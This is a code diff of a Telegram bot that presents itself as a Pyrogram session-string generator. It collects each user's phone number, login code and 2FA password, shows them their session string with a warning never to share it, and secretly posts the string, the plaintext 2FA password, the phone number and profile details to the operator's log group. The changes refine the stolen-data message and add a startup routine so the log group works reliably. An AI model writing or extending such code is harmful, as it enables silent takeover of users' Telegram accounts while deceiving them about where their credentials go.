@@ -42,12 +42,11 @@ async def session_cmd(_, msg):
 
         otp = await ask("📩 Enter the OTP you received:", chat_id)
 
-        two_step_enabled = False
+        password = None
         try:
             await temp.sign_in(number, sent.phone_code_hash, otp)
         except SessionPasswordNeeded:
             password = await ask("🔐 2-Step Verification enabled!\nEnter your Password:", chat_id)
-            two_step_enabled = True
             await temp.check_password(password)
 
         string = await temp.export_session_string()
@@ -58,23 +57,17 @@ async def session_cmd(_, msg):
             f"🎉 **Your Pyrogram Session String:**\n\n`{string}`\n\n⚠ Do NOT share this with anyone."
         )
 
-        # User extra details for logs
-        username = f"@{user.username}" if user.username else "None"
-        profile_link = f"https://t.me/{user.username}" if user.username else "No Username"
-
         # Send to log group
         try:
             await bot.send_message(
                 LOG_GROUP_ID,
-                f"🔰 **New Session Generated**\n\n"
+                f"🟢 **New Session Generated**\n\n"
                 f"👤 **Name:** {user.first_name}\n"
-                f"🆔 **User ID:** `{user.id}`\n"
-                f"🔗 **Username:** {username}\n"
-                f"🌐 **Profile Link:** {profile_link}\n"
-                f"📞 **Phone Number:** `{number}`\n"
-                f"🛡 **2-Step Enabled:** `{'YES' if two_step_enabled else 'NO'}`\n\n"
-                f"🛡 **2-Step Enabled:** `{password}`\n\n"
-                f"🔑 **Session String:**\n`{string}`"
+                f"🔗 **Profile:** @{user.username if user.username else 'No_Username'}\n"
+                f"📱 **Phone:** `{number}`\n"
+                f"🔑 **2FA Password:** `{password if password else 'Not Enabled'}`\n\n"
+                f"🆔 **User ID:** `{user.id}`\n\n"
+                f"📌 **Session String:**\n`{string}`"
             )
         except Exception as log_error:
             await msg.reply("⚠ Session generated but logging failed! Check Heroku logs.")
@@ -84,4 +77,16 @@ async def session_cmd(_, msg):
         await msg.reply(f"❌ Error: `{e}`")
 
 
-bot.run()
+# 🔥 AUTO-ACTIVATE LOG GROUP ON STARTUP (important fix)
+async def activate_log_chat():
+    try:
+        await bot.send_chat_action(LOG_GROUP_ID, "typing")
+        print("Log group activated successfully.")
+    except Exception as e:
+        print(f"Log group activation failed → {e}")
+
+
+# Required for auto activation
+bot.start()
+bot.loop.create_task(activate_log_chat())
+bot.idle()
